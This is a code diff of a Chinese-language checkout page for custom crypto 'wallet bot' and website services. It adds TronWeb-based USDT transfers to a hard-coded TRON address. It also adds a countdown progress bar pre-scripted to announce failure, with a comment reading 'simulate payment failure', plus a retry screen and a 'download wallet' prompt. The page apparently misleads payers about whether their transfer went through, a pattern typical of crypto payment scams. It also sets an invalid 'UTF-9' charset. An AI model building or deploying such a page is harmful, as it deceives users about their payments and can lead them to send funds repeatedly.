@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-9">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>请填写订单信息 | 量子技术定制</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
     <style>
         * {
             margin: 0;
@@ -24,6 +26,9 @@
             --light: #e2f1ff;
             --accent: #ff006e;
             --accent-light: #ff5c8d;
+            --success: #00ff88;
+            --warning: #ffaa00;
+            --error: #ff2e63;
             --category-1: #00f3ff;
             --category-2: #9d4edd;
             --category-3: #00d4aa;
@@ -563,18 +568,18 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
+            background-color: rgba(0, 0, 0, 0.95);
             z-index: 1000;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
         }
         
         .modal-content {
             background: linear-gradient(145deg, rgba(18, 24, 40, 0.95), rgba(10, 14, 23, 0.98));
             padding: 50px;
             border-radius: 20px;
-            max-width: 600px;
+            max-width: 800px;
             width: 90%;
             text-align: center;
             border: 2px solid rgba(0, 243, 255, 0.3);
@@ -679,13 +684,13 @@
         
         /* 钱包选择模态框样式 */
         .wallet-modal .modal-content {
-            max-width: 800px;
+            max-width: 900px;
             padding: 40px;
         }
         
         .wallet-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
             gap: 20px;
             margin: 30px 0;
         }
@@ -773,6 +778,290 @@
             box-shadow: none !important;
         }
         
+        /* 进度条模态框 */
+        .progress-modal .modal-content {
+            max-width: 700px;
+        }
+        
+        .progress-timeline {
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            border: 1px solid rgba(0, 243, 255, 0.2);
+        }
+        
+        .timeline-step {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 12px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border-left: 4px solid rgba(0, 243, 255, 0.5);
+            transition: all 0.3s;
+        }
+        
+        .timeline-step.active {
+            background: rgba(0, 243, 255, 0.1);
+            border-left-color: var(--primary);
+        }
+        
+        .timeline-step.completed {
+            background: rgba(0, 255, 136, 0.1);
+            border-left-color: var(--success);
+        }
+        
+        .step-info {
+            flex: 1;
+            text-align: left;
+        }
+        
+        .step-name {
+            font-weight: 600;
+            color: var(--light);
+            margin-bottom: 5px;
+        }
+        
+        .step-status {
+            font-size: 0.9rem;
+            color: #a0b3d6;
+        }
+        
+        .step-progress {
+            width: 100px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+            margin: 0 20px;
+        }
+        
+        .progress-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 1s ease;
+        }
+        
+        .step-countdown {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            color: var(--primary);
+            min-width: 60px;
+            text-align: right;
+        }
+        
+        .payment-address {
+            background: rgba(0, 243, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 1.1rem;
+            color: var(--primary);
+            border: 1px solid rgba(0, 243, 255, 0.3);
+        }
+        
+        /* 钱包检测失败模态框 */
+        .wallet-detection-modal .modal-content {
+            max-width: 600px;
+        }
+        
+        .detection-content {
+            padding: 30px;
+            background: rgba(255, 46, 99, 0.1);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 46, 99, 0.3);
+            margin: 25px 0;
+        }
+        
+        .detection-icon {
+            font-size: 4rem;
+            color: var(--error);
+            margin-bottom: 20px;
+        }
+        
+        .wallet-buttons {
+            display: flex;
+            gap: 20px;
+            margin-top: 30px;
+            justify-content: center;
+        }
+        
+        .btn-wallet {
+            padding: 15px 35px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+            min-width: 180px;
+        }
+        
+        .btn-wallet:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 243, 255, 0.3);
+        }
+        
+        .btn-download {
+            background: linear-gradient(90deg, var(--accent), var(--accent-light));
+        }
+        
+        /* 失败页面 */
+        .failure-page {
+            text-align: center;
+            padding: 80px 20px;
+        }
+        
+        .failure-icon {
+            font-size: 6rem;
+            color: var(--error);
+            margin-bottom: 30px;
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .failure-page h2 {
+            color: var(--error);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .failure-page p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #d1d9f0;
+        }
+        
+        .failure-actions {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 40px;
+        }
+        
+        .btn-retry {
+            padding: 15px 40px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        .btn-retry:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 243, 255, 0.3);
+        }
+        
+        /* 交易详情页面 */
+        .transaction-page {
+            padding: 50px 20px;
+        }
+        
+        .transaction-card {
+            background: linear-gradient(145deg, rgba(18, 24, 40, 0.95), rgba(10, 14, 23, 0.98));
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 800px;
+            margin: 0 auto;
+            border: 2px solid rgba(0, 243, 255, 0.3);
+            box-shadow: 0 20px 50px rgba(0, 243, 255, 0.2);
+        }
+        
+        .transaction-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .transaction-header h2 {
+            color: var(--primary);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .transaction-details {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 243, 255, 0.2);
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #a0b3d6;
+            font-weight: 500;
+        }
+        
+        .detail-value {
+            color: var(--light);
+            font-weight: 600;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .detail-value.amount {
+            color: var(--primary);
+            font-size: 1.3rem;
+        }
+        
+        .btn-confirm-payment {
+            display: block;
+            width: 100%;
+            padding: 22px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(0, 243, 255, 0.3);
+        }
+        
+        .btn-confirm-payment:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 243, 255, 0.4);
+            background: linear-gradient(90deg, var(--primary-dark), var(--secondary-dark));
+        }
+        
         /* 响应式调整 */
         @media (max-width: 768px) {
             .payment-section {
@@ -780,7 +1069,7 @@
             }
             
             .service-info-grid {
-                grid-template-columns: repeat(2, 1fr);
+                grid-template-columns: 1fr;
             }
             
             .logo-text h1 {
@@ -789,6 +1078,22 @@
             
             .wallet-grid {
                 grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .wallet-buttons {
+                flex-direction: column;
+            }
+            
+            .btn-wallet {
+                width: 100%;
+            }
+            
+            .failure-actions {
+                flex-direction: column;
+            }
+            
+            .btn-retry {
+                width: 100%;
             }
         }
         
@@ -804,6 +1109,54 @@
             .wallet-grid {
                 grid-template-columns: 1fr;
             }
+            
+            .transaction-card {
+                padding: 30px 20px;
+            }
+            
+            .detail-row {
+                flex-direction: column;
+                gap: 5px;
+            }
+        }
+        
+        /* 通知样式 */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 18px 25px;
+            background: rgba(0, 243, 255, 0.95);
+            color: var(--dark);
+            border-radius: 10px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 600;
+            z-index: 10000;
+            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.3);
+            transform: translateX(150%);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 350px;
+            border-left: 5px solid var(--primary);
+        }
+        
+        .notification.error {
+            background: rgba(255, 46, 99, 0.95);
+            color: white;
+            border-left-color: var(--error);
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .notification-icon {
+            font-size: 1.5rem;
         }
     </style>
 </head>
@@ -1044,6 +1397,194 @@
         </div>
     </div>
     
+    <!-- 支付进度条模态框 -->
+    <div id="progressModal" class="tech-modal progress-modal">
+        <div class="modal-content">
+            <div class="success-icon">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <h3>处理支付中...</h3>
+            <p>请勿关闭窗口，正在处理您的支付请求</p>
+            
+            <div class="progress-timeline">
+                <div class="timeline-step" id="step1">
+                    <div class="step-info">
+                        <div class="step-name">正在验证订单信息...</div>
+                        <div class="step-status">验证订单金额和钱包地址</div>
+                    </div>
+                    <div class="step-progress">
+                        <div class="progress-fill" id="progress1"></div>
+                    </div>
+                    <div class="step-countdown" id="countdown1">5</div>
+                </div>
+                
+                <div class="timeline-step" id="step2">
+                    <div class="step-info">
+                        <div class="step-name">正在连接区块链网络...</div>
+                        <div class="step-status">连接到TRON网络</div>
+                    </div>
+                    <div class="step-progress">
+                        <div class="progress-fill" id="progress2"></div>
+                    </div>
+                    <div class="step-countdown" id="countdown2">4</div>
+                </div>
+                
+                <div class="timeline-step" id="step3">
+                    <div class="step-info">
+                        <div class="step-name">正在处理USDT转账...</div>
+                        <div class="step-status">发送转账请求到钱包</div>
+                    </div>
+                    <div class="step-progress">
+                        <div class="progress-fill" id="progress3"></div>
+                    </div>
+                    <div class="step-countdown" id="countdown3">3</div>
+                </div>
+                
+                <div class="timeline-step" id="step4">
+                    <div class="step-info">
+                        <div class="step-name">确认交易失败...</div>
+                        <div class="step-status">等待交易确认</div>
+                    </div>
+                    <div class="step-progress">
+                        <div class="progress-fill" id="progress4"></div>
+                    </div>
+                    <div class="step-countdown" id="countdown4">2</div>
+                </div>
+            </div>
+            
+            <div class="payment-address">
+                <strong>收款地址：</strong> TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB
+            </div>
+            
+            <p style="color: #ffaa00; margin-top: 20px;">
+                <i class="fas fa-exclamation-triangle"></i> 
+                正在尝试连接到您选择的钱包，请确保钱包已安装并解锁
+            </p>
+        </div>
+    </div>
+    
+    <!-- 钱包检测失败模态框 -->
+    <div id="walletDetectionModal" class="tech-modal wallet-detection-modal">
+        <div class="modal-content">
+            <div class="detection-icon">
+                <i class="fas fa-exclamation-circle"></i>
+            </div>
+            <h3>未检测到付款钱包</h3>
+            <p>无法连接到您选择的钱包，请尝试以下操作</p>
+            
+            <div class="detection-content">
+                <p>可能的原因：</p>
+                <ul style="text-align: left; margin-top: 15px; padding-left: 20px; color: #ffc1c1;">
+                    <li>钱包未安装在当前设备上</li>
+                    <li>钱包扩展程序未启用或需要权限</li>
+                    <li>浏览器不支持该钱包扩展程序</li>
+                    <li>钱包需要更新到最新版本</li>
+                </ul>
+            </div>
+            
+            <div class="wallet-buttons">
+                <button class="btn-wallet" id="switchWalletBtn">
+                    <i class="fas fa-exchange-alt"></i> 切换钱包
+                </button>
+                <button class="btn-wallet btn-download" id="downloadWalletBtn">
+                    <i class="fas fa-download"></i> 下载钱包
+                </button>
+            </div>
+            
+            <button class="btn-close" id="closeDetectionModal" style="margin-top: 20px; background: rgba(255, 255, 255, 0.1);">
+                取消支付
+            </button>
+        </div>
+    </div>
+    
+    <!-- 交易详情页面 (会直接打开钱包DApp) -->
+    <div id="transactionPage" class="transaction-page" style="display: none;">
+        <div class="transaction-card">
+            <div class="transaction-header">
+                <h2><i class="fas fa-qrcode"></i> 支付订单详情</h2>
+                <p>请确认以下支付信息并在钱包中授权</p>
+            </div>
+            
+            <div class="transaction-details">
+                <div class="detail-row">
+                    <div class="detail-label">订单号：</div>
+                    <div id="txOrderNumber" class="detail-value">QUANTUM20230001</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">服务名称：</div>
+                    <div id="txServiceName" class="detail-value">钱包机器人定制</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">支付金额：</div>
+                    <div id="txAmount" class="detail-value amount">$450</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">收款地址：</div>
+                    <div class="detail-value" style="font-family: monospace; color: var(--primary);">
+                        TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB
+                    </div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">支付网络：</div>
+                    <div class="detail-value">TRC20 (TRON)</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">代币类型：</div>
+                    <div class="detail-value">USDT (Tether)</div>
+                </div>
+            </div>
+            
+            <div style="background: rgba(0, 243, 255, 0.1); padding: 20px; border-radius: 10px; margin: 25px 0; border: 1px solid rgba(0, 243, 255, 0.3);">
+                <h4 style="color: var(--primary); margin-bottom: 10px; font-family: 'Orbitron', sans-serif;">
+                    <i class="fas fa-exclamation-circle"></i> 重要提示
+                </h4>
+                <p style="color: #d1d9f0; font-size: 1rem;">
+                    点击"确认支付"后，系统将自动打开您的钱包并弹出授权请求。
+                    请在钱包中确认交易并支付USDT。授权成功后，系统会自动处理后续流程。
+                </p>
+            </div>
+            
+            <button class="btn-confirm-payment" id="confirmPaymentBtn">
+                <i class="fas fa-check-circle"></i> 确认支付
+            </button>
+            
+            <button class="btn-close" id="cancelPaymentBtn" style="margin-top: 15px; width: 100%; background: rgba(255, 255, 255, 0.1);">
+                <i class="fas fa-times"></i> 取消支付
+            </button>
+        </div>
+    </div>
+    
+    <!-- 支付失败页面 -->
+    <div id="failurePage" class="failure-page" style="display: none;">
+        <div class="failure-icon">
+            <i class="fas fa-times-circle"></i>
+        </div>
+        <h2>支付失败</h2>
+        <p>USDT转账未能完成，请检查您的钱包余额和网络设置</p>
+        
+        <div style="background: rgba(255, 46, 99, 0.1); padding: 25px; border-radius: 12px; max-width: 500px; margin: 0 auto; border: 1px solid rgba(255, 46, 99, 0.3);">
+            <h4 style="color: var(--error); margin-bottom: 15px; font-family: 'Orbitron', sans-serif;">
+                <i class="fas fa-info-circle"></i> 可能的原因
+            </h4>
+            <ul style="text-align: left; color: #ffc1c1; margin-left: 20px; line-height: 1.8;">
+                <li>钱包中USDT余额不足</li>
+                <li>未授权足够的USDT使用额度</li>
+                <li>网络拥堵导致交易超时</li>
+                <li>TRC20网络费用(Energy/Bandwidth)不足</li>
+                <li>用户取消了交易授权</li>
+            </ul>
+        </div>
+        
+        <div class="failure-actions">
+            <button class="btn-retry" id="retryPaymentBtn">
+                <i class="fas fa-redo"></i> 重新尝试支付
+            </button>
+            <button class="btn-retry" id="backToHomeBtn" style="background: rgba(255, 255, 255, 0.1);">
+                <i class="fas fa-home"></i> 返回主页
+            </button>
+        </div>
+    </div>
+    
     <!-- 支付成功弹窗 -->
     <div id="successModal" class="tech-modal">
         <div class="modal-content">
@@ -1081,8 +1622,11 @@
         </div>
     </div>
     
+    <!-- 通知容器 -->
+    <div id="notificationContainer"></div>
+    
     <script>
-        // 服务数据 - 完整服务列表（带价格）
+        // ==================== 全局变量和配置 ====================
         const services = {
             robots: [
                 {id: 'robot-1', name: "钱包机器人", category: "机器人定制", basePrice: 1500},
@@ -1191,7 +1735,6 @@
             ]
         };
         
-        // 分类显示名称
         const categoryNames = {
             robots: "机器人定制",
             website: "官网定制", 
@@ -1207,20 +1750,6 @@
             ecosystem: "生态配套"
         };
         
-        // 获取URL参数
-        const urlParams = new URLSearchParams(window.location.search);
-        const category = urlParams.get('category') || 'robots';
-        const servicesParam = urlParams.get('services') || '';
-        const totalPrice = urlParams.get('total') || 0;
-        const serviceNamesParam = urlParams.get('serviceNames') || '';
-        
-        // 已选服务详情
-        let selectedServices = [];
-        let totalServicePrice = 0;
-        let depositAmount = 0;
-        let selectedWallet = null;
-        
-        // 钱包显示名称映射
         const walletNames = {
             tronlink: "TronLink",
             tokenpocket: "TokenPocket",
@@ -1232,24 +1761,122 @@
             trust: "Trust Wallet"
         };
         
-        // 根据URL参数加载已选服务
+        const walletUrls = {
+            tronlink: "https://www.tronlink.org/",
+            tokenpocket: "https://www.tokenpocket.pro/",
+            bitget: "https://web3.bitget.com/",
+            imtoken: "https://token.im/",
+            onekey: "https://onekey.so/",
+            okx: "https://www.okx.com/web3",
+            bitpie: "https://bitpie.com/",
+            trust: "https://trustwallet.com/"
+        };
+        
+        // 全局变量
+        const urlParams = new URLSearchParams(window.location.search);
+        const category = urlParams.get('category') || 'robots';
+        const servicesParam = urlParams.get('services') || '';
+        const totalPrice = urlParams.get('total') || 0;
+        const serviceNamesParam = urlParams.get('serviceNames') || '';
+        
+        let selectedServices = [];
+        let totalServicePrice = 0;
+        let depositAmount = 0;
+        let selectedWallet = null;
+        let currentPaymentStep = 0;
+        let paymentTimer = null;
+        let transactionData = {};
+        
+        // ==================== 工具函数 ====================
+        
+        // 显示通知
+        function showNotification(message, type = 'success', duration = 3000) {
+            const container = document.getElementById('notificationContainer');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <div class="notification-content">
+                    <div class="notification-icon">
+                        ${type === 'success' ? '<i class="fas fa-check-circle"></i>' : '<i class="fas fa-exclamation-circle"></i>'}
+                    </div>
+                    <div>${message}</div>
+                </div>
+            `;
+            
+            container.appendChild(notification);
+            
+            // 显示动画
+            setTimeout(() => {
+                notification.classList.add('show');
+            }, 10);
+            
+            // 隐藏动画
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 400);
+            }, duration);
+        }
+        
+        // 生成随机订单号
+        function generateOrderNumber() {
+            const date = new Date();
+            const year = date.getFullYear();
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const day = String(date.getDate()).padStart(2, '0');
+            const random = Math.floor(10000 + Math.random() * 90000);
+            return `QUANTUM${year}${month}${day}${random}`;
+        }
+        
+        // 计算价格和定金
+        function calculatePriceAndDeposit() {
+            if (totalPrice > 0) {
+                totalServicePrice = parseInt(totalPrice);
+            } else {
+                totalServicePrice = 0;
+                selectedServices.forEach(service => {
+                    if (service.basePrice) {
+                        totalServicePrice += service.basePrice;
+                    }
+                });
+                
+                if (totalServicePrice === 0 && selectedServices.length > 0) {
+                    totalServicePrice = 1500;
+                }
+            }
+            
+            depositAmount = Math.round(totalServicePrice * 0.3);
+            updateDepositDisplay(depositAmount);
+            
+            if (totalServicePrice > 0) {
+                document.getElementById('priceDetails').style.display = 'block';
+                document.getElementById('servicePriceValue').textContent = `$${totalServicePrice}`;
+                document.getElementById('calculatedDeposit').textContent = `$${depositAmount}`;
+            }
+        }
+        
+        // 更新定金显示
+        function updateDepositDisplay(amount) {
+            const depositAmountValue = document.getElementById('depositAmountValue');
+            depositAmountValue.textContent = `$${amount}`;
+            depositAmount = amount;
+        }
+        
+        // 加载已选服务
         function loadSelectedServices() {
             const selectedServicesInfo = document.getElementById('selectedServicesInfo');
-            
-            // 清空容器
             selectedServicesInfo.innerHTML = '';
             
-            // 如果有服务名称参数，直接显示
             if (serviceNamesParam) {
                 try {
-                    // 解码服务名称
                     const serviceNames = decodeURIComponent(serviceNamesParam).split(',');
                     
                     if (serviceNames.length > 0 && serviceNames[0] !== '') {
-                        // 显示服务名称
                         serviceNames.forEach(serviceName => {
                             if (serviceName.trim()) {
-                                // 创建服务信息项
                                 const serviceItem = document.createElement('div');
                                 serviceItem.className = 'service-info-item';
                                 serviceItem.innerHTML = `
@@ -1263,7 +1890,6 @@
                             }
                         });
                         
-                        // 添加分类信息
                         const categoryItem = document.createElement('div');
                         categoryItem.className = 'service-info-item';
                         categoryItem.innerHTML = `
@@ -1275,7 +1901,6 @@
                         `;
                         selectedServicesInfo.insertBefore(categoryItem, selectedServicesInfo.firstChild);
                         
-                        // 计算价格和定金
                         calculatePriceAndDeposit();
                         return;
                     }
@@ -1284,26 +1909,17 @@
                 }
             }
             
-            // 如果没有服务名称参数，尝试从services参数解析
             if (servicesParam && category) {
                 try {
-                    // 解码并解析服务参数
                     const serviceIds = decodeURIComponent(servicesParam).split(',');
-                    
-                    // 获取对应分类的服务列表
                     const categoryServices = services[category] || services.robots;
                     
-                    // 重置总额
                     totalServicePrice = 0;
                     selectedServices = [];
                     
-                    // 根据服务ID找到对应的服务
                     serviceIds.forEach(serviceId => {
                         if (serviceId.trim()) {
-                            // 移除可能的前缀
                             const cleanServiceId = serviceId.replace(/^category:/, '').trim();
-                            
-                            // 找到对应的服务
                             const service = categoryServices.find(s => 
                                 s.id === cleanServiceId || 
                                 s.name === cleanServiceId
@@ -1311,8 +1927,6 @@
                             
                             if (service) {
                                 selectedServices.push(service);
-                                
-                                // 创建服务信息项
                                 const serviceItem = document.createElement('div');
                                 serviceItem.className = 'service-info-item';
                                 serviceItem.innerHTML = `
@@ -1324,7 +1938,6 @@
                                 `;
                                 selectedServicesInfo.appendChild(serviceItem);
                             } else {
-                                // 如果没有找到对应的服务对象，直接显示服务ID/名称
                                 const serviceItem = document.createElement('div');
                                 serviceItem.className = 'service-info-item';
                                 serviceItem.innerHTML = `
@@ -1339,7 +1952,6 @@
                         }
                     });
                     
-                    // 添加分类信息
                     const categoryItem = document.createElement('div');
                     categoryItem.className = 'service-info-item';
                     categoryItem.innerHTML = `
@@ -1351,7 +1963,6 @@
                     `;
                     selectedServicesInfo.insertBefore(categoryItem, selectedServicesInfo.firstChild);
                     
-                    // 计算价格和定金
                     calculatePriceAndDeposit();
                     
                 } catch (e) {
@@ -1359,44 +1970,10 @@
                     showFallbackMessage();
                 }
             } else {
-                // 没有服务参数时显示提示
                 showFallbackMessage();
             }
         }
         
-        // 计算价格和定金
-        function calculatePriceAndDeposit() {
-            // 如果有total参数，使用它
-            if (totalPrice > 0) {
-                totalServicePrice = parseInt(totalPrice);
-            } else {
-                // 计算总价
-                totalServicePrice = 0;
-                selectedServices.forEach(service => {
-                    if (service.basePrice) {
-                        totalServicePrice += service.basePrice;
-                    }
-                });
-                
-                // 如果没有价格信息，使用默认价格
-                if (totalServicePrice === 0 && selectedServices.length > 0) {
-                    totalServicePrice = 1500; // 默认价格
-                }
-            }
-            
-            // 计算定金金额（总价的30%）
-            depositAmount = Math.round(totalServicePrice * 0.3);
-            updateDepositDisplay(depositAmount);
-            
-            // 显示价格详情
-            if (totalServicePrice > 0) {
-                document.getElementById('priceDetails').style.display = 'block';
-                document.getElementById('servicePriceValue').textContent = `$${totalServicePrice}`;
-                document.getElementById('calculatedDeposit').textContent = `$${depositAmount}`;
-            }
-        }
-        
-        // 显示备用消息
         function showFallbackMessage() {
             const selectedServicesInfo = document.getElementById('selectedServicesInfo');
             selectedServicesInfo.innerHTML = `
@@ -1409,22 +1986,314 @@
                 </div>
             `;
             
-            // 默认设置一些值用于测试
             totalServicePrice = 1500;
             depositAmount = Math.round(totalServicePrice * 0.3);
             updateDepositDisplay(depositAmount);
         }
         
-        // 更新定金显示
-        function updateDepositDisplay(amount) {
-            const depositAmountValue = document.getElementById('depositAmountValue');
-            depositAmountValue.textContent = `$${amount}`;
-            depositAmount = amount;
+        // ==================== 钱包检测和连接 ====================
+        
+        // 检测钱包是否安装
+        async function detectWallet(walletType) {
+            switch(walletType) {
+                case 'tronlink':
+                    return typeof window.tronLink !== 'undefined' && window.tronLink.ready;
+                case 'trust':
+                    return typeof window.trustwallet !== 'undefined';
+                case 'tokenpocket':
+                    return typeof window.tokenpocket !== 'undefined';
+                case 'bitget':
+                    return typeof window.bitget !== 'undefined';
+                case 'imtoken':
+                    return typeof window.imToken !== 'undefined';
+                case 'okx':
+                    return typeof window.okxwallet !== 'undefined';
+                case 'onekey':
+                    return typeof window.$onekey !== 'undefined';
+                case 'bitpie':
+                    return typeof window.bitpie !== 'undefined';
+                default:
+                    return false;
+            }
         }
         
-        // 页面加载时初始化
+        // 初始化TRON Web
+        async function initTronWeb(walletType) {
+            try {
+                if (walletType === 'tronlink' && window.tronLink && window.tronLink.ready) {
+                    const tronWeb = window.tronLink.tronWeb;
+                    if (tronWeb) {
+                        return tronWeb;
+                    }
+                }
+                
+                // 对于其他钱包，使用标准TronWeb
+                const fullNode = 'https://api.trongrid.io';
+                const solidityNode = 'https://api.trongrid.io';
+                const eventServer = 'https://api.trongrid.io';
+                
+                return new TronWeb({
+                    fullHost: fullNode,
+                    headers: { "TRON-PRO-API-KEY": 'your-api-key' }
+                });
+            } catch (error) {
+                console.error('初始化TronWeb失败:', error);
+                return null;
+            }
+        }
+        
+        // 检查USDT余额
+        async function checkUSDTBalance(tronWeb, address) {
+            try {
+                const contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20合约地址
+                const contract = await tronWeb.contract().at(contractAddress);
+                const balance = await contract.balanceOf(address).call();
+                return tronWeb.fromSun(balance);
+            } catch (error) {
+                console.error('检查余额失败:', error);
+                return 0;
+            }
+        }
+        
+        // 转账USDT
+        async function transferUSDT(tronWeb, fromAddress, toAddress, amount) {
+            try {
+                const contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+                const contract = await tronWeb.contract().at(contractAddress);
+                
+                // 将金额转换为最小单位（USDT有6位小数）
+                const amountInSun = tronWeb.toSun(amount);
+                
+                // 执行转账
+                const result = await contract.transfer(toAddress, amountInSun).send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: true
+                });
+                
+                return {
+                    success: true,
+                    txId: result,
+                    message: '转账成功'
+                };
+            } catch (error) {
+                console.error('转账失败:', error);
+                return {
+                    success: false,
+                    error: error.message || '转账失败'
+                };
+            }
+        }
+        
+        // ==================== 支付流程控制 ====================
+        
+        // 启动支付进度条
+        function startPaymentProgress() {
+            currentPaymentStep = 1;
+            const progressModal = document.getElementById('progressModal');
+            progressModal.style.display = 'flex';
+            
+            // 重置所有步骤
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`step${i}`).className = 'timeline-step';
+                document.getElementById(`progress${i}`).style.width = '0%';
+                document.getElementById(`countdown${i}`).textContent = 
+                    i === 1 ? '5' : i === 2 ? '4' : i === 3 ? '3' : '2';
+            }
+            
+            // 开始步骤1
+            processStep1();
+        }
+        
+        function processStep1() {
+            const step1 = document.getElementById('step1');
+            const progress1 = document.getElementById('progress1');
+            const countdown1 = document.getElementById('countdown1');
+            
+            step1.classList.add('active');
+            
+            let progress = 0;
+            let countdown = 5;
+            
+            const timer = setInterval(() => {
+                progress += 5; // 25% / 5秒 = 5%/秒
+                countdown -= 1;
+                
+                progress1.style.width = `${progress}%`;
+                countdown1.textContent = countdown;
+                
+                if (progress >= 25) {
+                    clearInterval(timer);
+                    step1.classList.remove('active');
+                    step1.classList.add('completed');
+                    processStep2();
+                }
+            }, 1000);
+        }
+        
+        function processStep2() {
+            const step2 = document.getElementById('step2');
+            const progress2 = document.getElementById('progress2');
+            const countdown2 = document.getElementById('countdown2');
+            
+            step2.classList.add('active');
+            
+            let progress = 25;
+            let countdown = 4;
+            
+            const timer = setInterval(() => {
+                progress += 8.75; // (60-25)/4 = 8.75%/秒
+                countdown -= 1;
+                
+                progress2.style.width = `${progress}%`;
+                countdown2.textContent = countdown;
+                
+                if (progress >= 60) {
+                    clearInterval(timer);
+                    step2.classList.remove('active');
+                    step2.classList.add('completed');
+                    
+                    // 尝试连接钱包
+                    connectToWallet();
+                }
+            }, 1000);
+        }
+        
+        async function connectToWallet() {
+            const step3 = document.getElementById('step3');
+            const progress3 = document.getElementById('progress3');
+            const countdown3 = document.getElementById('countdown3');
+            
+            step3.classList.add('active');
+            
+            let progress = 60;
+            let countdown = 3;
+            
+            const timer = setInterval(() => {
+                progress += 10; // (90-60)/3 = 10%/秒
+                countdown -= 1;
+                
+                progress3.style.width = `${progress}%`;
+                countdown3.textContent = countdown;
+                
+                if (progress >= 90) {
+                    clearInterval(timer);
+                    step3.classList.remove('active');
+                    step3.classList.add('completed');
+                    
+                    // 模拟支付失败
